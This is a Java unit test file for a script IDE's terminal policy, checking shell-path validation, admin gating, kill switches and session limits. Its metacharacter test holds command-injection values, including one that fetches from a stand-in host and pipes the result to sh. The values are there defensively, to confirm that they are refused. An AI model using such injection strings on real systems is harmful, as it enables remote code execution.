package com.gaskony.scriptide.gateway.term;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The terminal's configuration gates.
 *
 * <p>The shell-path rules are the ones that matter: {@code TerminalSession}
 * interpolates the value into the string it hands {@code script -c}, so this
 * validator is the only thing between a mistyped property and a command
 * injection opened by a config file.</p>
 */
class TerminalPolicyTest {

    @AfterEach
    void clearProperties() {
        System.clearProperty(TerminalPolicy.PROP_ENABLED);
        System.clearProperty(TerminalPolicy.PROP_REQUIRE_ADMIN);
        System.clearProperty(TerminalPolicy.PROP_ACKNOWLEDGE_RISK);
        System.clearProperty(TerminalPolicy.PROP_SHELL);
        System.clearProperty(TerminalPolicy.PROP_MAX_PER_SESSION);
    }

    @Test
    @DisplayName("a shell path carrying shell metacharacters is refused")
    void shellPathRejectsMetacharacters() {
        // Each of these would be executed by the shell running our -c string if
        // the value were passed through. An allowlist is used rather than a list
        // of forbidden characters precisely so this test cannot become the
        // definition of "safe".
        assertThat(TerminalPolicy.isSafeShellPath("/bin/bash; curl http://x/y | sh")).isFalse();
        assertThat(TerminalPolicy.isSafeShellPath("/bin/bash $(id)")).isFalse();
        assertThat(TerminalPolicy.isSafeShellPath("/bin/bash`id`")).isFalse();
        assertThat(TerminalPolicy.isSafeShellPath("/bin/bash&&id")).isFalse();
        assertThat(TerminalPolicy.isSafeShellPath("/bin/ba sh")).isFalse();
    }

    @Test
    @DisplayName("a relative path is refused even when it names a real program")
    void shellPathMustBeAbsolute() {
        assertThat(TerminalPolicy.isSafeShellPath("bash")).isFalse();
        assertThat(TerminalPolicy.isSafeShellPath("../../bin/bash")).isFalse();
    }

    @Test
    @DisplayName("a path that does not exist is refused rather than launched")
    void shellPathMustExist() {
        assertThat(TerminalPolicy.isSafeShellPath("/bin/definitely-not-a-shell-9f3a")).isFalse();
    }

    @Test
    @DisplayName("a bad shell property falls back to a built-in candidate, never to nothing")
    void badShellPropertyFallsBack() {
        System.setProperty(TerminalPolicy.PROP_SHELL, "/bin/bash; id");
        String shell = TerminalPolicy.shell();
        // On a Unix host one of the candidates exists; the point is that the
        // REJECTED value is not what came back.
        assertThat(shell).isNotEqualTo("/bin/bash; id");
    }

    @Test
    @DisplayName("requireAdmin cannot be turned off by one property alone")
    void requireAdminNeedsBothFlags() {
        System.setProperty(TerminalPolicy.PROP_REQUIRE_ADMIN, "false");
        assertThat(TerminalPolicy.requireAdmin())
            .as("one flag must not be enough to hand out a Gateway shell")
            .isTrue();

        System.setProperty(TerminalPolicy.PROP_ACKNOWLEDGE_RISK, "true");
        assertThat(TerminalPolicy.requireAdmin()).isFalse();
    }

    @Test
    @DisplayName("the terminal has its OWN kill switch, independent of script execution")
    void terminalHasItsOwnSwitch() {
        // A site that wants the Script Console but not a shell must be able to
        // have exactly that; sharing execution.enabled would make one of the two
        // settings a decoration.
        assertThat(TerminalPolicy.PROP_ENABLED).isNotEqualTo("com.gaskony.scriptide.execution.enabled");
        System.setProperty(TerminalPolicy.PROP_ENABLED, "false");
        assertThat(TerminalPolicy.terminalEnabled()).isFalse();
    }

    @Test
    @DisplayName("a typo in a boolean property keeps the SAFE default, not false")
    void typoKeepsTheSafeDefault() {
        System.setProperty(TerminalPolicy.PROP_REQUIRE_ADMIN, "no");
        assertThat(TerminalPolicy.requireAdmin()).isTrue();
        System.setProperty(TerminalPolicy.PROP_ENABLED, "yes-please");
        assertThat(TerminalPolicy.terminalEnabled()).isTrue();
    }

    @Test
    @DisplayName("maxPerSession is clamped, so a silly value cannot open 10000 shells")
    void maxPerSessionIsClamped() {
        System.setProperty(TerminalPolicy.PROP_MAX_PER_SESSION, "10000");
        assertThat(TerminalPolicy.maxPerSession()).isEqualTo(TerminalPolicy.MAX_MAX_PER_SESSION);
        System.setProperty(TerminalPolicy.PROP_MAX_PER_SESSION, "0");
        assertThat(TerminalPolicy.maxPerSession()).isEqualTo(1);
    }
}
